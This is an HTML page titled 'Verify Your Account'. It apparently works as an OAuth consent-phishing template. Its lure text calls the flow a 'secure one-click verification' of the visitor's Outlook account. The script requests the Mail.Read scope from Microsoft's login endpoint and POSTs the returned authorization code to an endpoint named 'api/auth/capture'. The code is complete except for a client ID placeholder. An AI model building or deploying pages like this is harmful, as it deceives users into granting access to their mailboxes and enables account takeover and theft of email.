<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 450px;
            width: 100%;
            padding: 50px 40px;
            text-align: center;
        }
        
        .logo {
            font-size: 50px;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #333;
            font-size: 26px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .auth-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            width: 100%;
            margin: 20px 0;
        }
        
        .auth-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
            font-size: 14px;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }
        
        .loading {
            display: none;
            text-align: center;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔐</div>
        <h1>Verify Your Account</h1>
        <p class="subtitle">Click below to authenticate your Outlook account. This is a secure one-click verification process.</p>
        
        <button class="auth-button" onclick="initiateAuth()">
            ✉️ Sign in with Outlook
        </button>
        
        <div class="status" id="status"></div>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Signing you in...</p>
        </div>
    </div>

    <script>
        // Configuration - Update these with your Azure app credentials
        const CONFIG = {
            clientId: 'YOUR_CLIENT_ID',
            authority: 'https://login.microsoftonline.com/common',
            redirectUri: window.location.href.split('?')[0],
            scopes: ['User.Read', 'Mail.Read']
        };

        function initiateAuth() {
            const authUrl = `${CONFIG.authority}/oauth2/v2.0/authorize?` +
                `client_id=${CONFIG.clientId}&` +
                `redirect_uri=${encodeURIComponent(CONFIG.redirectUri)}&` +
                `response_type=code&` +
                `scope=${encodeURIComponent(CONFIG.scopes.join(' '))}&` +
                `response_mode=query`;

            document.getElementById('loading').style.display = 'block';
            window.location.href = authUrl;
        }

        // Handle OAuth callback
        function handleCallback() {
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code');
            const error = params.get('error');

            if (error) {
                showStatus(`Authentication failed: ${error}`, 'error');
                return;
            }

            if (code) {
                document.getElementById('loading').style.display = 'block';
                exchangeCodeForToken(code);
            }
        }

        function exchangeCodeForToken(code) {
            fetch('api/auth/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ code })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showStatus('✓ Account verified successfully!', 'success');
                    // Redirect after 2 seconds
                    setTimeout(() => {
                        window.location.href = 'success.html';
                    }, 2000);
                } else {
                    showStatus(`Error: ${data.error}`, 'error');
                }
            })
            .catch(err => {
                showStatus(`Error: ${err.message}`, 'error');
            })
            .finally(() => {
                document.getElementById('loading').style.display = 'none';
            });
        }

        function showStatus(message, type) {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
        }

        // Check for callback
        if (window.location.search) {
            handleCallback();
        }
    </script>
</body>
</html>
